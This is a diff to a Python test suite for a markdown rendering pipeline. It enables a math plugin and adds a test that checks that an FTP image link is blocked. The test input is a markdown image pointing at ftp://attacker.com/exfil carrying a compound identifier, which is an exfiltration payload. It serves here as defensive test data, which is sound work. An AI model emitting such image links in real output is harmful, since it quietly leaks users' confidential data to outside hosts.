@@ -76,7 +76,7 @@ def _render_pipeline(text: str) -> str:
     """Render markdown through the full site build pipeline."""
     import mistune
 
-    _md = mistune.create_markdown(escape=True, plugins=["table", "strikethrough"])
+    _md = mistune.create_markdown(escape=True, plugins=["table", "strikethrough", "math"])
     text = _strip_leading_h1(text)
     text = _dedent_tables(text)
     html = _md(text)
@@ -478,6 +478,14 @@ def test_full_security_integration():
     assert 'hERG' in html
 
 
+def test_ftp_image_blocked():
+    """FTP/FTPS images are blocked (not just http/https)."""
+    md = "![](ftp://attacker.com/exfil?compound=XYZ-123)\n"
+    html = _render_pipeline(md)
+    assert '<img' not in html, f"FTP img survived: {html!r}"
+    assert 'blocked-image' in html
+
+
 # ---------------------------------------------------------------------------
 # Runner
 # ---------------------------------------------------------------------------
@@ -524,6 +532,7 @@ if __name__ == "__main__":
     _run("sanitize_returns_warnings", test_sanitize_returns_warnings)
     _run("raw_html_still_blocked", test_raw_html_still_blocked)
     _run("full_security_integration", test_full_security_integration)
+    _run("ftp_image_blocked", test_ftp_image_blocked)
 
     # Report
     passed = sum(1 for _, ok, _ in _RESULTS if ok)
